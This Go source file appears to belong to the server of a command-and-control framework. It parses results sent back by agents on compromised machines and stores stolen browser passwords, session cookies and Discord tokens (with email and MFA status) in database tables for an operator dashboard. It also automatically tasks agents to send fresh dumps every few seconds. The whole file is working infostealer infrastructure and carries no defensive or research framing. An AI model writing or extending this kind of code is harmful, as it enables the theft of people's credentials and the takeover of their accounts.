package api

import (
	"encoding/json"
	"log"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"chemicalumbra.dev/server/pkg/task"
)

// The HTTP beacon returns collection output as a JSON array in the task result.
// These helpers parse that array and land it in the same tables the WebSocket
// agent writes, so the Credentials / Cookies / Discord tabs read one shape.

type credResult struct {
	Browser int    `json:"browser"`
	URL     string `json:"url"`
	User    string `json:"username"`
	Pass    string `json:"password"`
	Created string `json:"created"`
}

func storeCredentialsResult(database *sqlx.DB, agentID, out string) {
	var rows []credResult
	if json.Unmarshal([]byte(strings.TrimSpace(out)), &rows) != nil {
		return
	}
	_, _ = database.Exec(`DELETE FROM credentials WHERE agent_id = ?`, agentID)
	for _, c := range rows {
		_, _ = database.Exec(`INSERT INTO credentials (id, agent_id, browser, url, username, password, created) VALUES (?, ?, ?, ?, ?, ?, ?)`,
			uuid.New().String(), agentID, c.Browser, c.URL, c.User, c.Pass, c.Created)
	}
	log.Printf("[collect] credentials agent=%s rows=%d", agentID, len(rows))
	go snapshotDB()
}

type cookieResult struct {
	Browser    int    `json:"browser"`
	Host       string `json:"host"`
	Name       string `json:"name"`
	Value      string `json:"value"`
	Path       string `json:"path"`
	Expires    int64  `json:"expires_utc"`
	Secure     int    `json:"is_secure"`
	HTTPOnly   int    `json:"is_httponly"`
	Persistent int    `json:"is_persistent"`
	EncVersion int    `json:"enc_version"`
}

func storeCookiesResult(database *sqlx.DB, agentID, out string) {
	var rows []cookieResult
	if json.Unmarshal([]byte(strings.TrimSpace(out)), &rows) != nil {
		return
	}
	_, _ = database.Exec(`DELETE FROM cookies WHERE agent_id = ?`, agentID)
	for _, c := range rows {
		_, _ = database.Exec(`INSERT INTO cookies (id, agent_id, browser, host, name, value, path, expires_utc, is_secure, is_httponly, is_persistent, enc_version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
			uuid.New().String(), agentID, c.Browser, c.Host, c.Name, c.Value, c.Path, c.Expires, c.Secure, c.HTTPOnly, c.Persistent, c.EncVersion)
	}
	log.Printf("[collect] cookies agent=%s rows=%d", agentID, len(rows))
	go snapshotDB()
}

type discordResult struct {
	Token         string `json:"token"`
	Email         string `json:"email"`
	UserID        string `json:"user_id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Avatar        string `json:"avatar"`
	MFA           bool   `json:"mfa_enabled"`
	Source        string `json:"source"`
}

func storeDiscordResult(database *sqlx.DB, agentID, out string) {
	var rows []discordResult
	if json.Unmarshal([]byte(strings.TrimSpace(out)), &rows) != nil {
		return
	}
	_, _ = database.Exec(`DELETE FROM discord_tokens WHERE agent_id = ?`, agentID)
	for _, t := range rows {
		mfa := 0
		if t.MFA {
			mfa = 1
		}
		_, _ = database.Exec(`INSERT INTO discord_tokens (id, agent_id, token, email, user_id, username, discriminator, avatar, mfa_enabled, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
			uuid.New().String(), agentID, t.Token, t.Email, t.UserID, t.Username, t.Discriminator, t.Avatar, mfa, t.Source)
	}
	log.Printf("[collect] discord agent=%s rows=%d", agentID, len(rows))
	go snapshotDB()
}

// collectQueue is the slice of *task.Queue the refresh helper needs.
type collectQueue interface {
	Enqueue(agentID string, command interface{}, args interface{}, priority int) (*task.Task, error)
}

// refreshCollector asks the agent for a fresh dump at most once every few
// seconds. The tabs only GET, so without this nothing would ever ask.
func refreshCollector(q collectQueue, agentID, command string) {
	if q == nil || db == nil || agentID == "" {
		return
	}
	var n int
	_ = db.Get(&n, `
		SELECT COUNT(*) FROM tasks
		WHERE agent_id = ? AND TRIM(command,'"') = ?
		  AND status IN ('pending','sent')
		  AND created_at > ?`, agentID, command, time.Now().Add(-5*time.Second))
	if n > 0 {
		return
	}
	_, _ = q.Enqueue(agentID, command, map[string]interface{}{}, 0)
}
